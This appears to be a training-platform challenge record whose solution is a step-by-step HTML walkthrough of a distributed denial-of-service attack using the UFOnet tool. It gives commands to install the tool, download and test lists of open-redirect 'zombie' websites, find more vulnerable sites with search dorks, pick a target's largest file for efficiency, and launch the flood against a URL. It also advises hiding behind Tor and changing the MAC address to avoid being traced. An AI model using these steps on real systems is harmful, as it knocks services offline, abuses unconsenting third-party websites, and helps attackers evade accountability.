{"description":"","goal":"<h2>Make a DDoS attack using UFOnet.</h2>","solution":"<h3><span style=\"text-decoration: underline;\">Intro</span></h3>\n<p><strong>DoS attack</strong> is an action that compromises the use of networks, systems or applications. Resource that could be attacked are the network bandwidth, system resources and application resources.</p>\n<p><strong>DDoS attack</strong> is a kind of DoS attack, in which the attacker creates a botnet made up of many compromised systems, called zombies, that will then be used to launch an attack against a single target.</p>\n<p>The tool we will use to achieve our goal is <strong>UFOnet</strong>. UFOnet is a software that allows to perform DDoS attack through the exploitation of the <strong>Open Redirect</strong> vulnerability in order to use third-parties websites to act as a botnet.</p>\n<p>A website is vulnerable to Open Redirect - that is one of the OWASP 2013 Top Ten vulnerabilities (A10 - Unvalidated Redirects and Forwards) - when parameter values (the portion of URL after \"?\") in an HTTP request, allow for information that will redirect a user to a new website without any validation of the target of redirect. This allow the attacker to launch a phishing scam and steal user credentials.</p>\n<p>In our case, Open Redirects allows us to drive web applications to make requests to another site. This means that the <strong>zombies</strong> that form the botnet used by UFOnet are nothing more than websites that present a vulnerability of this type: so there is no virus or malware to install on the zombies.</p>\n<p>The architectural scheme is as follows:</p>\n<p><img src=\"https://ufonet.03c8.net/ufonet/ufonet-schema.png\" alt=\"\" width=\"424\" height=\"331\" /></p>\n<p><strong>Note</strong>: Usage of UFONet, as well as that of any other hacking tool, for attacking targets without prior mutual consent <strong>is illegal</strong>. For this reason, an attacker needs to remain anonymous as much as possible and therefore rely on a proxy such as Tor to hide the real IP address. For even greater security (from this point of view) it is also advisable to change the MAC address.</p>\n<p>&nbsp;</p>\n<h3><span style=\"text-decoration: underline;\">Installation</span></h3>\n<p>UFOnet requires Python (&gt;=3) and the following libraries:</p>\n<ul>\n<li>python3-pycurl;</li>\n<li>python3-geoip;</li>\n<li>libgeoip-dev;</li>\n<li>libgeoip1;</li>\n<li>python3-whois;</li>\n<li>python3-crypto;</li>\n<li>python3-requests;</li>\n<li>python3-scapy.</li>\n</ul>\n<p>Python should already be installed on kali but, if not, you can easily install it from the terminal by typing:</p>\n<p><em>apt-get install python3.7</em></p>\n<p>While for the libraries you will need to install pip (the package manager for the Python coding language) first:</p>\n<p><em>apt install python3-pip</em></p>\n<p>After that, you can use pip3 to install the libraries you need:</p>\n<p><em>pip3 install GeoIP</em><br /><em>pip3 install python-geoip</em><br /><em>pip3 install pygeoip</em><br /><em>pip3 install requests</em><br /><em>pip3 install pycrypto</em><br /><em>pip3 install pycurl</em><br /><em>pip3 install whois</em><br /><em>pip3 install scapy-python3</em></p>\n<p>At this point you can get the UFOnet source:</p>\n<p><em>git clone <a href=\"https://github.com/epsylon/ufonet\">https://github.com/epsylon/ufonet</a></em></p>\n<p><em><img src=\"https://i.postimg.cc/26pw5h8v/1-1.png\" alt=\"\" width=\"590\" height=\"202\" /></em></p>\n<p>&nbsp;</p>\n<h3><span style=\"text-decoration: underline;\">Searching for Zombies<br /></span></h3>\n<p>At this point we will be able to go to the main UFOnet directory and start using it:</p>\n<p><em>cd ufonet</em></p>\n<p>The first thing to do is to download the zombies which will then be used to perform the attack:</p>\n<p style=\"text-align: left;\"><em>./ufonet --download-zombies</em></p>\n<p>If the following error is returned:</p>\n<p><img src=\"https://i.postimg.cc/903jp16w/1-5-1.png\" alt=\"\" width=\"727\" height=\"122\" /></p>\n<p>run the command as suggested:</p>\n<p><em>python3 ufonet --download-zombies</em></p>\n<p>(If you can't download the zombies in this way don't worry, as you continue reading you will be explained how else to download them).</p>\n<p><img src=\"https://i.postimg.cc/zX1dF4cF/1-5.png\" alt=\"\" width=\"823\" height=\"740\" /></p>\n<p>In this way the tool will download from a central server a list of zombies already identified as usable.</p>\n<p>&nbsp;<img src=\"https://i.postimg.cc/KYvp18pQ/1-6.png\" alt=\"\" width=\"585\" height=\"390\" /></p>\n<p>Agree to merge the new troops in your army and, if you want, you can refuse&nbsp; the next request that will be made to you.</p>\n<p>At this point the botnet will consist of 12854 elements. The first four (zombies, droids, aliens and UCAVs) are bots vulnerable to different type of <strong>open redirect attacks</strong> while the other four (X-RPCs, DNSs, NTPs, SNMPs) can be used for <strong>amplification attacks</strong>. Ufonet in fact supports many other types of extra attacks and you can see which ones by consulting the help of the tool (Extra Attack section).</p>\n<p>Sometimes it can happen that the server contacted to download the list of zombies is not reachable because it is temporarily busy. In this case you can download zombies from the official Github repository; in this case the command will be the following:</p>\n<p><em>./ufonet --download-github</em><em><br /></em></p>\n<p>After that, you should check that the zombies on the list are actually working and accordingly update the botnet:</p>\n<p><em>python3 ufonet -t 'botnet/zombies.txt'</em></p>\n<p><img src=\"https://i.postimg.cc/yYBxhRF1/11-0.png\" alt=\"\" width=\"358\" height=\"47\" /></p>\n<p><img src=\"https://i.postimg.cc/8PrJwGY4/11.png\" alt=\"\" width=\"373\" height=\"138\" /></p>\n<p>You can also increase this list yourself by looking for new websites that have open redirect vulnerabilities. This research can be done through the so-called \"<strong>Dorks</strong>\". Remember that make this type of query means using the search engine to customize the search in detail in order to identify vulnerable websites and which expose sensitive information.<br /><br />So, run the following command:<br /><br /><em>python3 ufonet -s 'proxy.php?url=' --sa</em></p>\n<p><img src=\"https://i.postimg.cc/PxF4hN68/9.png\" alt=\"\" width=\"372\" height=\"55\" /></p>\n<p><img src=\"https://i.postimg.cc/BbYRrqFh/9-1.png\" alt=\"\" width=\"378\" height=\"178\" /><br /><br />Other type of query string could be 'check.cgi?url=' or 'checklink?uri='.<br /><br />Anyway, through this command, UFOnet will search (-s option) for a specific dork (sites containing 'proxy.php?url=' and that therefore could be vulnerable to open redirects) using all search engine at its service. (--sa option). At the end of the process, you will be asked if you want to check if they are valid zombies and then if you want to update your botnet. Say yes to both questions.<br /><br />You can also do a more accurate research:</p>\n<p><em>python3 ufonet --sd 'botnet/dorks.txt' --sa</em></p>\n<p><em><img src=\"https://i.postimg.cc/CMNxJtvX/10-0.png\" alt=\"\" width=\"397\" height=\"45\" /></em></p>\n<p><em><img src=\"https://i.postimg.cc/2y2j6bbr/10.png\" alt=\"\" width=\"561\" height=\"528\" /></em></p>\n<p><em><img src=\"https://i.postimg.cc/dtVtfBp1/10-1.png\" alt=\"\" width=\"368\" height=\"138\" /></em></p>\n<p>In this way, the list of strings contained in UFOnet's dork.txt file will be used for your search.</p>\n<p>&nbsp;</p>\n<h3><span style=\"text-decoration: underline;\">Inspecting a target</span></h3>\n<p>UFOnet can search for biggest file on your target by <strong>crawlering</strong> it. So you can use this file to make the attack more efficient:</p>\n<p><em>python3 ufonet -i http://yourtarget.com</em></p>\n<p>The tool will return you the path of the largest file found on the host you indicated. In this way, during the attack phase, you can specify the file to be requested from the target host.</p>\n<p><strong>Note</strong>: this step is not necessary.</p>\n<p>&nbsp;</p>\n<h3><span style=\"text-decoration: underline;\">UFOnet GUI<br /></span></h3>\n<p>UFOnet provides a <strong>graphical interface</strong> that can be used to perform most of the operations described above. You can open it using the following command:</p>\n<p><em>python3 ufonet --gui</em></p>\n<p><em><img src=\"https://i.postimg.cc/j274NFJS/1-3.png\" alt=\"\" width=\"804\" height=\"476\" /></em></p>\n<p>If the interface does not open automatically, open the browser and go to: localhost:9999. Then click on \"START MOTERSHIP\".</p>\n<p><em><img src=\"https://i.postimg.cc/6qMtrMsF/5.png\" alt=\"\" width=\"1117\" height=\"695\" /></em></p>\n<p>&nbsp;</p>\n<h3><span style=\"text-decoration: underline;\">Attacking a target</span></h3>\n<p>At this point, you are ready to <strong>carry out the attack</strong>. This, as well as the other operations, can be performed both from the terminal and from the GUI.</p>\n<p>From the terminal, the command is the following:</p>\n<p><em>&nbsp;python3 ufonet -a http://yourtarget.com -r 100</em></p>\n<p>Where the -a option indicates the target to attack and the -r option indicates the number of rounds. Alternatively, if in the inspection phase you found a large file, you can insert it into the command with the -b option in order to request that specific resource and make the attack itself more efficient:</p>\n<p><em>&nbsp;python3 ufonet -a http://yourtarget.com -r 100 -b \"/images/largefile.jpg\"<br /></em></p>\n<h4>Note: For my \"attack\" I used - as a target - a site I created, I didn't request any large files, I set a single repetition (-r 1) and I used the Github's zombie list which is up to date about 4 months ago, reason why some of the zombies were not even available. All this in order not to do any damage and only give a demonstration of how to perform the attack and how it works.</h4>\n<p><em><img src=\"https://i.postimg.cc/JzVvTQj0/8-4.png\" alt=\"\" width=\"622\" height=\"403\" /></em></p>\n<p><em><img src=\"https://i.postimg.cc/dtHc4C4T/8-3.png\" alt=\"\" width=\"522\" height=\"735\" /></em></p>\n<p>Finally, let's see how to launch the attack via GUI.</p>\n<p>Go to the \"Attack\" section, fill in the fields of the table and to see the bots in action check the box \"Generate the map\".</p>\n<p><img src=\"https://i.postimg.cc/NFSHBFQG/6-1.png\" alt=\"\" width=\"608\" height=\"438\" /></p>\n<p><img src=\"https://i.postimg.cc/sDGWKYJM/8.png\" alt=\"\" width=\"1280\" height=\"545\" /></p>\n<p><img src=\"https://i.postimg.cc/ryPWSn56/8-2.png\" alt=\"\" width=\"726\" height=\"712\" /></p>\n<p>So, a new window will open that will show you live the various bots while they direct the requests to the target of the attack; while in the main window you can see the zombies that are attacking.</p>","readme":"","author":"NS"}
